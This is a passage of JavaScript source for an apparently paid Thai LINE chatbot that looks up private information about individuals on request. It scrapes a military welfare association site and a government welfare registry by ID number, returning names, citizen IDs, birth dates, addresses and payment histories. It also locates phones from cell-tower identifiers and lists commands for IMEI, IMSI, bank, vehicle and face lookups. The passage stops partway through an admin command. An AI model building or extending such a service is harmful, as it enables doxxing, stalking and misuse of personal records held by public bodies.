  const branchCode = shop.branchCode || '-';
  const address = shop.address || '-';
  const lineUrl = shop.line || '-';

  const parts = branchCode.split(' ');
  const storeIdOnly = parts.shift() || '-';
  const storeName = parts.join(' ') || '-';

  const lineId = lineUrl.match(/@[\w-]+/i)?.[0] || '-';

  return ` ข้อมูลสาขา 7-Eleven

◇ รหัสประจำสาขา
  ${storeIdOnly}
◇ ชื่อของสาขา
  ${storeName}

◇ รายละเอียดที่อยู่
  
${address}

 LINE Official: ${lineId}

 เพิ่มเพื่อน LINE:
${lineUrl}`;
}

async function searchJunkCall(phone) {
  try {
    const cleanPhone = String(phone || '').replace(/\D/g, '');

    if (!/^0\d{8,9}$/.test(cleanPhone)) {
      return '❌ รูปแบบเบอร์โทรไม่ถูกต้อง';
    }

    const url =
      `https://junkcall.org/th/?q=${encodeURIComponent(cleanPhone)}`;

    const response = await axios.get(url, {
      timeout: 20000,

      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' +
          'AppleWebKit/537.36 (KHTML, like Gecko) ' +
          'Chrome/151.0.0.0 Safari/537.36',

        'Accept':
          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

        'Accept-Language':
          'th-TH,th;q=0.9,en;q=0.8'
      },

      maxRedirects: 5
    });

    const html = String(response.data || '');

    // ตรวจกรณี JunkCall เปิด bot verification
    if (
      /verify that you're not a robot/i.test(html) ||
      /javascript is disabled/i.test(html)
    ) {
      return (
        '⚠️ JunkCall ปฏิเสธการค้นหาจาก Server ชั่วคราว\n' +
        ` ${url}`
      );
    }

    const $ = cheerio.load(html);

    const bodyText = $('body')
      .text()
      .replace(/\r/g, '')
      .replace(/[ \t]+/g, ' ')
      .replace(/\n\s+/g, '\n')
      .trim();

    console.log('JUNKCALL BODY:', bodyText.slice(0, 4000));

    // ดึงจำนวนที่เห็นในตาราง
    const unknownMatch =
      bodyText.match(/ไม่รู้จัก\s*(\d+)/i);

    const waitingMatch =
      bodyText.match(/รอการยืนยัน\s*(\d+)/i);

    const whitelistMatch =
      bodyText.match(/บัญชีขาว\s*(\d+)/i);

    const policeMatch =
      bodyText.match(/ตำรวจ\s*(\d+)/i);

    const unknown = unknownMatch?.[1] || '0';
    const waiting = waitingMatch?.[1] || '0';
    const whitelist = whitelistMatch?.[1] || '0';
    const police = policeMatch?.[1] || '0';

    const total =
      Number(unknown) +
      Number(waiting) +
      Number(whitelist);

    return (
      ` JUNKCALL
` +
      `────────────
` +
      ` หมายเลข: ${cleanPhone}\n\n` +

      ` ผลการค้นหา
` +
      `• ไม่รู้จัก: ${unknown}\n` +
      `• รอการยืนยัน: ${waiting}\n` +
      `• บัญชีขาว: ${whitelist}\n\n` +

      ` รายละเอียด
` +
      `• ตำรวจ: ${police}\n\n` +

      ` จำนวนรายงาน: ${total}`
    );

  } catch (err) {
    console.error(
      'JunkCall error:',
      err.response?.status,
      err.response?.data || err.message
    );

    return '❌ ไม่สามารถค้นหา JunkCall ได้ในขณะนี้';
  }
}

// =========================
// kp% ตรวจสอบสถานภาพสมาชิก สก.ทบ.
// =========================
const RTA_MEMBER_API_URL = 'http://rtacs.chapanakit-rta.com/checkmemberstatus/MemberStatus.php';

const THAI_MONTH_NAMES = [
  'มกราคม', 'กุมภาพันธ์', 'มีนาคม', 'เมษายน', 'พฤษภาคม', 'มิถุนายน',
  'กรกฎาคม', 'สิงหาคม', 'กันยายน', 'ตุลาคม', 'พฤศจิกายน', 'ธันวาคม'
];

const THAI_MONTH_SHORT = [
  'ม.ค.', 'ก.พ.', 'มี.ค.', 'เม.ย.', 'พ.ค.', 'มิ.ย.',
  'ก.ค.', 'ส.ค.', 'ก.ย.', 'ต.ค.', 'พ.ย.', 'ธ.ค.'
];

async function fetchRtaMemberStatus(id) {
  const resp = await axios.post(
    RTA_MEMBER_API_URL,
    new URLSearchParams({ id: String(id).trim() }).toString(),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36'
      },
      timeout: 30000
    }
  );
  return String(resp.data || '');
}

function rtaClean(value) {
  return String(value || '').replace(/\s+/g, ' ').trim();
}

function rtaDateDMY(text) {
  const m = String(text || '').match(/(\d{1,2})\s+([\u0E00-\u0E7F]+)\s+พ\.ศ\.\s*(\d{4})/);
  if (!m) return rtaClean(text);
  const day = m[1].padStart(2, '0');
  const monthIndex = THAI_MONTH_NAMES.indexOf(m[2]);
  const month = monthIndex >= 0 ? String(monthIndex + 1).padStart(2, '0') : m[2];
  return `${day}/${month}/${m[3]}`;
}

function rtaMonthYear(text) {
  return rtaClean(text).replace(/พ\.ศ\.\s*/g, '').trim();
}

function rtaShortMonthYear(text) {
  const m = String(text || '').match(/([\u0E00-\u0E7F]+)\s+พ\.ศ\.\s*(\d{4})/);
  if (!m) return rtaClean(text);
  const monthIndex = THAI_MONTH_NAMES.indexOf(m[1]);
  const month = monthIndex >= 0 ? THAI_MONTH_SHORT[monthIndex] : m[1];
  return `${month} ${m[2]}`;
}

function rtaAddressLine(fieldValue) {
  const value = rtaClean(fieldValue);
  if (!value) return '';

  const grab = (re) => {
    const m = value.match(re);
    return m ? m[1].trim() : '';
  };

  const no = grab(/เลขที่\s*([^\s]+)/);
  const moo = grab(/หมู่\s*([^\s]+)/);
  const soi = grab(/ซอย\s*([^\s]+)/);
  const road = grab(/ถนน\s*([^\s]+)/);
  const tambol = grab(/ตำบล\/แขวง\s*(.+?)(?=\s+(?:อำเภอ\/เขต|รหัสไปรษณีย์)|$)/);
  const amphur = grab(/อำเภอ\/เขต\s*(.+?)(?=\s+(?:จังหวัด|รหัสไปรษณีย์)|$)/);
  const province = grab(/จังหวัด\s*(.+?)(?=\s+(?:รหัสไปรษณีย์)|$)/);
  const zip = grab(/รหัสไปรษณีย์\s*([^\s]+)/);

  const isBangkok = /กรุงเทพ/.test(province);

  const parts = [];
  if (no && no !== '-') parts.push(no);
  if (moo && moo !== '-') parts.push(`ม.${moo}`);
  if (road && road !== '-') parts.push(`ถ.${road}`);
  if (soi && soi !== '-') parts.push(`ซ.${soi}`);
  if (tambol && tambol !== '-') parts.push(`${isBangkok ? 'แขวง' : 'ต.'}${tambol}`);
  if (amphur && amphur !== '-') parts.push(`${isBangkok ? 'เขต' : 'อ.'}${amphur}`);
  if (province && province !== '-') parts.push(isBangkok ? province : `จ.${province}`);
  if (zip && zip !== '-') parts.push(zip);

  return parts.join(' ');
}

async function lookupUnwiredCell(radio, mcc, mnc, lac, cid) {
  try {
    const { data } = await axios.post(
      UNWIREDLABS_URL,
      {
        token: UNWIREDLABS_TOKEN,
        radio,
        mcc: Number(mcc),
        mnc: Number(mnc),

        cells: [
          {
            lac: Number(lac),
            cid: Number(cid)
          }
        ],

        address: 1
      },
      {
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 20000
      }
    );

    return data;

  } catch (err) {
    console.log(
      `Unwired ${radio} error:`,
      err.response?.data || err.message
    );

    return null;
  }
}


async function autoLookupUnwiredCell(mcc, mnc, lac, cid) {

  // ลอง 3G ก่อน
  const umts = await lookupUnwiredCell(
    'umts',
    mcc,
    mnc,
    lac,
    cid
  );

  if (umts?.status === 'ok') {
    return {
      radio: '3G / UMTS',
      data: umts
    };
  }

  // ถ้า 3G ไม่พบ ลอง LTE
  const lte = await lookupUnwiredCell(
    'lte',
    mcc,
    mnc,
    lac,
    cid
  );

  if (lte?.status === 'ok') {
    return {
      radio: '4G / LTE',
      data: lte
    };
  }

  return {
    radio: null,
    data: lte || umts
  };
}

function rtaWrapLines(text, max = 48) {
  if (!text) return [];
  const words = String(text).split(' ');
  const lines = [];
  let line = '';

  words.forEach(word => {
    const candidate = (line + ' ' + word).trim();
    if (line && candidate.length > max) {
      lines.push(line);
      line = word;
    } else {
      line = candidate;
    }
  });

  if (line) lines.push(line);
  return lines;
}

function buildOfficeHourSearchFlex(pid) {
  const now = new Date();

  const dateText = now.toLocaleDateString('en-GB', {
    timeZone: 'Asia/Bangkok',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric'
  }).replace(/\//g, '-');

  const timeText = now.toLocaleTimeString('en-GB', {
    timeZone: 'Asia/Bangkok',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false
  });

  return {
    type: 'flex',
    altText: `ผลการตรวจสอบ PID ${pid}`,
    contents: {
      type: 'bubble',
      size: 'mega',

      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '18px',
        contents: [
          {
            type: 'text',
            text: ` PID : ${pid}`,
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg',
            wrap: true
          }
        ]
      },

      body: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '18px',
        spacing: 'md',
        contents: [
          {
            type: 'text',
            text: '❌ ไม่พบข้อมูล',
            weight: 'bold',
            size: 'md',
            color: '#DC2626'
          },

          {
            type: 'separator',
            margin: 'md'
          },

          {
            type: 'text',
            text: " กรุณาดำเนินการสืบค้น\nเฉพาะในช่วงเวลาราชการเท่านั้น",
            wrap: true,
            size: 'sm',
            color: '#334155',
            margin: 'md'
          },

          {
            type: 'box',
            layout: 'vertical',
            spacing: 'sm',
            margin: 'md',
            contents: [
              {
                type: 'text',
                text: " เปิดให้บริการ : 09:00 น.",
                size: 'sm',
                color: '#334155'
              },
              {
                type: 'text',
                text: " ปิดให้บริการ : 15:30 น.",
                size: 'sm',
                color: '#334155'
              }
            ]
          },

          {
            type: 'text',
            text: '⚠️ ไม่สามารถสืบค้นนอกช่วงเวลาที่กำหนดได้',
            wrap: true,
            size: 'sm',
            color: '#B45309',
            margin: 'md'
          },

          {
            type: 'separator',
            margin: 'md'
          },

          {
            type: 'text',
            text: ` วันที่สืบค้น
#${dateText} ${timeText} นาที`,
            wrap: true,
            size: 'sm',
            color: '#475569',
            margin: 'md'
          }
        ]
      }
    }
  };
}

function formatRtaMemberStatus(html, queryId) {
  const $ = cheerio.load(html || '');

  const fields = {};
  $('lable.text-success').each((_, el) => {
    const label = rtaClean($(el).text());
    const valueDiv = $(el).next('div');
    const spanText = rtaClean(valueDiv.find('span.block').first().text());
    const directText = rtaClean(valueDiv.clone().children().remove().end().text());
    fields[label] = spanText || directText;
  });

  const memberNo = fields['เลขทะเบียนสมาชิก'] || queryId;

  const tables = $('table').toArray();
  const readRows = (tableEl) => {
    const rows = [];
    $(tableEl).find('tbody tr').each((_, tr) => {
      const cells = $(tr).find('td').map((_, td) => rtaClean($(td).text())).get();
      rows.push(cells);
    });
    return rows;
  };

  let billing = [];
  let overdue = [];
  let history = [];

  tables.forEach((tableEl) => {
    const header = rtaClean($(tableEl).find('thead').text());
    if (!header) return;
    if (header.includes('จำนวนเงินที่ค้าง')) {
      overdue = readRows(tableEl);
    } else if (header.includes('จำนวนเงิน')) {
      const theadClass = rtaClean($(tableEl).find('thead tr').attr('class') || '');
      if (theadClass.includes('info')) {
        history = readRows(tableEl);
      } else {
        billing = readRows(tableEl);
      }
    }
  });

  if (!memberNo && !billing.length && !history.length) {
    return `❌ ไม่พบข้อมูลสมาชิกเลขที่ ${queryId}`;
  }

  const id = (fields['เลขประจำตัวประชาชน'] || '-').replace(/-/g, '');
  const name = fields['ชื่อ - สกุล'] || '-';
  const birth = rtaDateDMY(fields['วันเกิด']);
  const gender = fields['เพศ'] || '-';
  const unit = fields['หน่วยต้นสังกัด'] || 'ไม่ระบุ';
  const memberSince = rtaDateDMY(fields['เป็นสมาชิกตั้งแต่']);
  const payMethod = fields['วิธีการชำระ'] || '-';
  const status = fields['สถานะสมาชิก'] || '-';
  const memberAddrLines = rtaWrapLines(rtaAddressLine(fields['ที่อยู่สำหรับติดต่อ']));

  const receiverName = fields['ผู้รับเงินสงเคราะห์'] || '-';
  const receiverAddrLines = rtaWrapLines(rtaAddressLine(fields['ที่อยู่ผู้รับเงินสงเคราะห์']));

  const billingRow = billing[0] || [];
  const billingMonth = billingRow[0] ? rtaMonthYear(billingRow[0]) : '-';
  const billingAmount = billingRow[1] || '-';

  const overdueStatus = overdue.length && !/ไม่มียอดค้างชำระ/.test(overdue[0].join(' '))
    ? `⚠️ มียอดค้างชำระ ${overdue.length} งวด`
    : '✅ ไม่มีงวดค้างชำระ';

  const historyLines = history.map((row, i) => {
    const isLast = i === history.length - 1;
    const month = row[0] ? rtaShortMonthYear(row[0]) : '-';
    const amount = row[1] || '-';
    return `${isLast ? "• " : "• "}  ${month} ━ ${amount} บาท`;
  });

  let total = 0;
  history.forEach(row => {
    const n = Number(String(row[1] || '').replace(/,/g, ''));
    if (Number.isFinite(n)) total += n;
  });
  const totalText = total.toLocaleString('en-US', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
  });

  const lines = [];
  lines.push(" ข้อมูลสมาชิก");
  lines.push(`• เลขทะเบียนสมาชิก: ${memberNo}`);
  lines.push(`◇ ชื่อที่ระบุ
  ${name}`);
  if (id && id !== '-') lines.push(`• ID: ${id}`);
  if (birth && birth !== '-') lines.push(`◇ วันเดือนปีเกิด
  ${birth}`);
  if (gender && gender !== '-') lines.push(`• เพศ: ${gender}`);
  lines.push(`• หน่วยต้นสังกัด: ${unit}`);
  if (memberAddrLines.length) {
    lines.push("• ที่อยู่สำหรับติดต่อ:");
    memberAddrLines.forEach(addrLine => lines.push(`  ${addrLine}`));
  }
  if (memberSince && memberSince !== '-') lines.push(`• เป็นสมาชิกตั้งแต่: ${memberSince}`);
  if (payMethod && payMethod !== '-') {
    lines.push("• วิธีการชำระ:");
    lines.push(`  ${payMethod}`);
  }
  lines.push(`• ✅ สถานะสมาชิก: ${status}`);

  if (receiverName && receiverName !== '-') {
    lines.push('');
    lines.push(" ผู้รับเงินสงเคราะห์");
    lines.push(`◇ ชื่อที่ระบุ
  ${receiverName}`);
    if (receiverAddrLines.length) {
      lines.push("◇ รายละเอียดที่อยู่\n  ");
      receiverAddrLines.forEach(addrLine => lines.push(`  ${addrLine}`));
    }
  }

  lines.push('');
  lines.push(" เรียกเก็บเงินสงเคราะห์");
  lines.push(`◇ เดือนของงวด
  ${billingMonth}`);
  lines.push(`• จำนวนเงิน: ${billingAmount} บาท`);
  lines.push(`• สถานะค้างชำระ: ${overdueStatus}`);

  if (historyLines.length) {
    lines.push('');
    lines.push(" ประวัติชำระย้อนหลัง 12 เดือน");
    lines.push(...historyLines);
    lines.push('');
    lines.push(` รวมยอดชำระ 12 เดือน: ${totalText} บาท`);
  }

  return limitLineMessage(lines.join('\n'));
}

// =====================================
// DLA WELFARE
// ระบบตรวจสอบข้อมูลเบี้ยยังชีพ
// =====================================

async function fetchDlaWelfare(citizenId) {

  const url =
    'https://welfare.dla.go.th/webview/';

  const commonHeaders = {
    'User-Agent':
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/154 Safari/537.36',

    'Accept':
      'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',

    'Accept-Language':
      'th,en;q=0.9',

    'Referer':
      url
  };


  // =====================================
  // เปิดหน้าก่อน เพื่อรับ Session Cookie
  // =====================================

  const firstResponse =
    await axios.get(
      url,
      {
        headers:
          commonHeaders,

        timeout:
          30000
      }
    );


  const setCookies =
    firstResponse.headers[
      'set-cookie'
    ] || [];


  const cookie =
    setCookies
      .map(item =>
        String(item)
          .split(';')[0]
      )
      .join('; ');


  // =====================================
  // ส่งเลขบัตรไปค้นหา
  // =====================================

  const form =
    new URLSearchParams();

  form.append(
    'citizenId',
    citizenId
  );


  const response =
    await axios.post(
      url,

      form.toString(),

      {
        timeout:
          30000,

        responseType:
          'text',

        headers: {
          ...commonHeaders,

          'Content-Type':
            'application/x-www-form-urlencoded',

          'Origin':
            'https://welfare.dla.go.th',

          ...(cookie
            ? {
                Cookie:
                  cookie
              }
            : {})
        }
      }
    );


  return response.data;
}


// =====================================
// อ่านผล HTML
// =====================================

function parseDlaWelfare(
  html,
  citizenId
) {

  const $ =
    cheerio.load(
      String(html || '')
    );


  const bodyText =
    $('body')
      .text()
      .replace(/\u00a0/g, ' ')
      .replace(/[ \t]+/g, ' ')
      .replace(/\n\s*\n/g, '\n')
      .trim();


  const found =
    bodyText.includes(
      'พบข้อมูลของผู้มีสิทธิ์ได้รับเบี้ยยังชีพ'
    );


  // =====================================
  // ไม่พบข้อมูล
  // =====================================

  if (!found) {

    const errorText =
      $('.fieldBoldRed')
        .first()
        .text()
        .replace(/\s+/g, ' ')
        .trim();


    return (
` ตรวจสอบข้อมูลเบี้ยยังชีพ

◇ หมายเลขบัตร
  ${citizenId}

❌ ${
  errorText ||
  'ไม่พบข้อมูลของผู้มีสิทธิ์ได้รับเบี้ยยังชีพ'
}`
    );
  }


  // =====================================
  // พบข้อมูล
  // =====================================

  let localOrg = '';
  let district = '';
  let province = '';
  let phone = '';


  $('span').each(
    (_, element) => {

      const value =
        $(element)
          .text()
          .replace(/\s+/g, ' ')
          .trim();


      if (
        value.startsWith('อปท:')
      ) {

        localOrg =
          value
            .replace(
              /^อปท:\s*/,
              ''
            )
            .trim();
      }


      else if (
        value.startsWith('อำเภอ:')
      ) {

        district =
          value
            .replace(
              /^อำเภอ:\s*/,
              ''
            )
            .trim();
      }


      else if (
        value.startsWith('จังหวัด:')
      ) {

        province =
          value
            .replace(
              /^จังหวัด:\s*/,
              ''
            )
            .trim();
      }


      else if (
        value.startsWith('เบอร์ติดต่อ:')
      ) {

        phone =
          value
            .replace(
              /^เบอร์ติดต่อ:\s*/,
              ''
            )
            .trim();
      }

    }
  );


  return (
` ข้อมูลผู้มีสิทธิ์ได้รับเบี้ยยังชีพ

✅ พบข้อมูล

◇ หมายเลขบัตร
  ${citizenId}

 อปท. : ${localOrg || '-'}
 อำเภอ : ${district || '-'}
◇ จังหวัดที่ระบุ
  ${province || '-'}
◇ เบอร์สำหรับติดต่อ
  ${phone || '-'}`
  );
}

// Canonical search names map to the existing handlers. Administrative and
// registration commands deliberately remain outside this registry.
function getNectSearchCommands() {
  return {
    a: 'a#', all: 'all%', atm: 'atm%', b: 'b%',
    bn: 'bn%', bq: 'bq%', c: 'c#', car: 'car#',
    cctv: 'cctv%', cell: 'cell%', chphis: 'chphis%', cid: 'cid#',
    cj: 'cj%', d: 'd#', dbd: 'dbd%', dc: 'dc%',
    dis: 'dis%', dl: 'dl#', doc: 'doc#', dol: 'dol%',
    dr: 'dr%', f: 'f#', for: 'for%', fx: 'fx#',
    geo: 'geo%', h: 'h#', hospital: 'h%', icc: 'icc%',
    imei: 'imei%', imsi: 'imsi%', ip: 'ip%', jk: 'jk%',
    kp: 'kp%', lc: 'lc%', loa: 'loa%', lw: 'lw%',
    map: 'map%', me: 'me%', nb: 'nb%', nm: 'nm%',
    pb: 'pb%', peab: 'peab%', peac: 'peac%', pean: 'pean%',
    peau: 'peau%', phis: 'phis%', picf: 'picf%', pid: 'pid%',
    ps: 'ps#', psi: 'psi#', pw: 'pw%', pwa: 'pwa%',
    s: 's%', sc: 'sc%', se: 'se%', si: 'si%',
    soc: 'soc%', st: 'st%', t: 't#', tic: 'tic%',
    tid: 'tid#', tisi: 'tisi%', tn: 'tn#', tr: 'tr%',
    tro: 'tro%', tv: 'tv#', uf: 'uf%', web: 'web%', wf: 'wf%',
    ff: 'ff%', face: 'face%', pt: 'pt%', base: 'base%', bank: 'bank%',
    mea: 'mea%', kru: 'kru%', on: '%', net: '?', menu: 'menu%'
  };
}

// Only a known command at the beginning is translated. Payload, casing inside
// the payload, and surrounding whitespace are kept byte for byte.
function normalizeNectSearchCommand(value) {
  const text = String(value == null ? '' : value);
  const match = /^(\s*)([a-z][a-z0-9]*)@/i.exec(text);
  if (!match) return text;
  const commands = getNectSearchCommands();
  const keyword = match[2].toLowerCase();
  if (!Object.prototype.hasOwnProperty.call(commands, keyword)) return text;
  return match[1] + commands[keyword] + text.slice(match[0].length);
}

// Use this converter only on static help, syntax, and example strings. Do not
// apply it to user input or data returned by a search API.
function formatNectSearchSyntax(value) {
  const text = String(value == null ? '' : value);
  const legacyNames = {};
  for (const [keyword, legacy] of Object.entries(getNectSearchCommands())) {
    if (keyword === 'menu' || legacy === '%' || legacy === '?') continue;
    legacyNames[legacy] = keyword + '@';
  }
  legacyNames['pean#'] = 'pean@';
  const escapeRegExp = token => token.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const tokenPattern = new RegExp(
    '(?<![\\p{L}\\p{N}_])(?:' +
      Object.keys(legacyNames).sort((a, b) => b.length - a.length)
        .map(escapeRegExp).join('|') + ')',
    'giu'
  );
  const formatChunk = chunk => {
    if (/^\s*%\s*$/.test(chunk)) return chunk.replace('%', 'on@');
    if (/^\s*\?\s*$/.test(chunk)) return chunk.replace('?', 'net@');
    return chunk
      .replace(tokenPattern, token => legacyNames[token.toLowerCase()])
      .replace(/(?<![\p{L}\p{N}_./%?&=+#@-])%(?=(?:\+?\d|เบอร์))/gu, 'on@')
      .replace(/(?<![\p{L}\p{N}_./%?&=+#@-])\?(?=(?:\+?\d|เบอร์))/gu, 'net@');
  };

  // URL queries/fragments and structured administrative/registration command
  // examples can contain symbols that resemble a search command.
  const protectedPattern = /https?:\/\/[^\s<>"'`]+|(?<![\p{L}\p{N}_])@[a-z0-9_-]+,[^\r\n]*|(?<![\p{L}\p{N}_])(?:regis%|send#|member#|renew(?:30|90|180|365)#|ระงับt#|ปลดt#|ระงับsi#|ปลดsi#|อนุญาติดีแทค#|ยกเลิกดีแทค#|อนุญาตประกันสังคม#|ยกเลิกประกันสังคม#|ยกเลิกสมาชิก#|ระงับสมาชิก#|อนุญาติais#|ยกเลิกa#|อนุญาตfx#|ยกเลิกfx#|อนุญาตสัญญาณ#|ยกเลิกสัญญาณ#|เพิ่มวัน#|อนุญาตสปสช#|ยกเลิกสปสช#)[^\r\n]*/giu;
  let output = '';
  let cursor = 0;
  for (const match of text.matchAll(protectedPattern)) {
    output += formatChunk(text.slice(cursor, match.index)) + match[0];
    cursor = match.index + match[0].length;
  }
  return output + formatChunk(text.slice(cursor));
}

async function handleText(event) {
  const userId = event.source.userId;
  const text = normalizeNectSearchCommand((event.message.text || '').trim());

// =====================================
  // ข้อมูลสมาชิกผู้สืบค้น
  // =====================================
  const db =
    loadDB();

  const member =
    db.members?.[userId] || null;

// =====================================
// ตรวจสมาชิกถูกระงับ
// =====================================
if (
  !isAdmin(userId) &&
  member?.status === 'suspended'
) {

  return reply(event.replyToken, {
    type: 'text',
    text:
`User ของท่านถูกระงับ
เนื่องจากสิทธิ์หมดอายุ
ต้องการต่ออายุใช้งานติดต่อแอดมิน :
https://line.me/ti/p/mVmD-ncfvU`
  });
}

// =====================================
// SUPBANK SUPPORT
// เฉพาะสมาชิกที่ใช้งานได้
// คำสั่ง: supbank%
// =====================================
if (
  text
    .toLowerCase()
    .trim() === 'supbank%'
) {

  // =====================================
  // ตรวจสิทธิ์สมาชิก
  // =====================================
  if (
    !isAdmin(userId) &&
    !isActiveMember(member)
  ) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
` สำหรับสมาชิกที่มีสิทธิ์ใช้งานเท่านั้น

หากต้องการสมัครหรือต่ออายุสมาชิก
กรุณาติดต่อแอดมิน`
      }
    );
  }


  const qrUrl =
  'https://memegabot.com/public/supbank_qr.jpg?v=2';


  return reply(
    event.replyToken,
    {
      type: 'flex',

      altText:
        'สนับสนุนทีมงานคอนเนค',

      contents: {
        type: 'bubble',
        size: 'mega',

        // ==============================
        // HEADER
        // ==============================
        header: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#0B0F14',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: 'สนับสนุนทีมงานคอนเนค',
              weight: 'bold',
              size: 'xl',
              color: '#FFFFFF',
              align: 'center',
              wrap: true
            },
            {
              type: 'text',
              text: 'SUPPORT CONNECT TEAM',
              size: 'xs',
              color: '#9CA3AF',
              align: 'center',
              margin: 'sm'
            }
          ]
        },


        // ==============================
        // QR CODE
        // ==============================
        hero: {
  type: 'image',
  url: qrUrl,
  size: 'full',
  aspectRatio: '1:1',
  aspectMode: 'fit',
  backgroundColor: '#FFFFFF'
},


        // ==============================
        // BODY
        // ==============================
        body: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#111827',
          paddingAll: '20px',
          spacing: 'md',

          contents: [
            {
              type: 'text',
              text: 'สายการเงิน',
              weight: 'bold',
              size: 'md',
              color: '#D1D5DB',
              align: 'center'
            },

            {
              type: 'box',
              layout: 'vertical',
              backgroundColor: '#1F2937',
              cornerRadius: 'lg',
              paddingAll: '16px',
              margin: 'sm',

              contents: [
                {
                  type: 'text',
                  text: '6,000 บาท',
                  weight: 'bold',
                  size: 'xxl',
                  color: '#FBBF24',
                  align: 'center'
                },
                {
                  type: 'text',
                  text: 'ระยะเวลา 6 เดือน',
                  size: 'md',
                  color: '#FFFFFF',
                  align: 'center',
                  margin: 'sm'
                }
              ]
            },

            {
              type: 'separator',
              color: '#374151',
              margin: 'md'
            },

            {
              type: 'text',
              text: 'สแกน QR Code เพื่อสนับสนุน',
              size: 'sm',
              color: '#D1D5DB',
              align: 'center',
              wrap: true,
              margin: 'md'
            }
          ]
        },


        // ==============================
        // FOOTER
        // ==============================
        footer: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#0B0F14',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: 'ขอบพระคุณทุกท่านที่สนับสนุน',
              weight: 'bold',
              size: 'sm',
              color: '#FFFFFF',
              align: 'center',
              wrap: true
            },
            {
              type: 'text',
              text: '🙏',
              size: 'xl',
              align: 'center',
              margin: 'sm'
            }
          ]
        }
      }
    }
  );
}

    if (
  text === 'รับทราบกฏของระบบ'
) {

  return reply(
    event.replyToken,
    buildAcknowledgeRulesFlex()
  );

}

// =====================================
// ADMIN : ระงับ t#
// ตัวอย่าง ระงับt#0812345678
// =====================================
if (
  text
    .toLowerCase()
    .startsWith('ระงับt#')
) {

  if (!ADMIN_IDS.includes(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
    });
  }

  const phone =
    text
      .replace(/^ระงับt#/i, '')
      .trim()
      .replace(/\D/g, '');

  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ กรุณาระบุเบอร์สมาชิก 10 หลัก

ตัวอย่าง
ระงับt#0812345678`
    });
  }

  const memberEntry =
    Object.entries(db.members || {})
      .find(([uid, m]) => {

        const memberPhone =
          String(
            m?.phone ||
            m?.tel ||
            m?.mobile ||
            ''
          )
            .replace(/\D/g, '');

        return memberPhone === phone;
      });

  if (!memberEntry) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ ไม่พบสมาชิก

 เบอร์ : ${phone}`
    });
  }

  const [
    targetUserId,
    targetMember
  ] = memberEntry;

  db.tBlocked =
    db.tBlocked || {};

  db.tBlocked[targetUserId] =
    true;

  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text:
` ระงับคำสั่ง t@ เรียบร้อย

 สมาชิก : ${
  targetMember?.fullname ||
  targetMember?.fullName ||
  '-'
}
 เบอร์ : ${phone}

สมาชิกจะไม่สามารถใช้งานคำสั่ง t@ ได้`
  });
}


// =====================================
// ADMIN : ปลดระงับ t#
// ตัวอย่าง ปลดt#0812345678
// =====================================
if (
  text
    .toLowerCase()
    .startsWith('ปลดt#')
) {

  if (!ADMIN_IDS.includes(userId)) {
    return reply(event.replyToken, {
      type: 'text',
      text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
    });
  }

  const phone =
    text
      .replace(/^ปลดt#/i, '')
      .trim()
      .replace(/\D/g, '');

  if (!/^0\d{9}$/.test(phone)) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ กรุณาระบุเบอร์สมาชิก 10 หลัก

ตัวอย่าง
ปลดt#0812345678`
    });
  }

  const memberEntry =
    Object.entries(db.members || {})
      .find(([uid, m]) => {

        const memberPhone =
          String(
            m?.phone ||
            m?.tel ||
            m?.mobile ||
            ''
          )
            .replace(/\D/g, '');

        return memberPhone === phone;
      });

  if (!memberEntry) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ ไม่พบสมาชิก

 เบอร์ : ${phone}`
    });
  }

  const [
    targetUserId,
    targetMember
  ] = memberEntry;

  db.tBlocked =
    db.tBlocked || {};

  delete db.tBlocked[
    targetUserId
  ];

  saveDB(db);

  return reply(event.replyToken, {
    type: 'text',
    text:
`✅ ปลดระงับคำสั่ง t@ เรียบร้อย

 สมาชิก : ${
  targetMember?.fullname ||
  targetMember?.fullName ||
  '-'
}
 เบอร์ : ${phone}

สมาชิกสามารถใช้งานคำสั่ง t@ ได้ตามปกติ`
  });
}


  // =====================================
  // เปิด Search Audit อัตโนมัติ
  // =====================================
  if (
    event.replyToken &&
    member &&
    shouldAddSearchAudit(text)
  ) {

    SEARCH_AUDIT_CONTEXT.set(
      event.replyToken,
      member
    );
  }

// =====================================
// ADMIN : ระงับ SI
// ตัวอย่าง ระงับsi#0812345678
// =====================================
if (
  text
    .toLowerCase()
    .startsWith('ระงับsi#')
) {

  if (!ADMIN_IDS.includes(userId)) {
    return reply(
      event.replyToken,
      {
        type: 'text',
        text: '❌ คำสั่งนี้สำหรับแอดมินเท่านั้น'
      }
    );
  }


  const phone =
    text
      .replace(/^ระงับsi#/i, '')
      .trim()
      .replace(/\D/g, '');


  if (!/^0\d{9}$/.test(phone)) {
    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`❌ กรุณาระบุเบอร์สมาชิก 10 หลัก

ตัวอย่าง
ระงับsi#0812345678`
      }
    );
  }


